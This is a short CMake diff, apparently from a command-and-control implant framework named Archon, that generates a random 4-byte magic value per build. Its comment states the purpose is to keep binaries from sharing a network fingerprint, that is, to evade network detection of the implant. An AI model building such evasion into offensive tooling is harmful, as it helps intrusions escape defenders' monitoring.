@@ -69,6 +69,17 @@ set( MAIN_SOURCE
 )
 
 
+# ARC-10: generate a random 4-byte magic per build so no two Archon binaries
+# share the same network fingerprint.  The teamserver independently supplies
+# -DARCHON_MAGIC_VALUE=0x... when producing a real payload via the build API.
+execute_process(
+    COMMAND openssl rand -hex 4
+    OUTPUT_VARIABLE ARCHON_MAGIC_HEX
+    OUTPUT_STRIP_TRAILING_WHITESPACE
+)
+string( PREPEND ARCHON_MAGIC_HEX "0x" )
+add_compile_definitions( ARCHON_MAGIC_VALUE=${ARCHON_MAGIC_HEX} )
+
 # preprocessor flags
 add_compile_definitions( DEBUG )
 
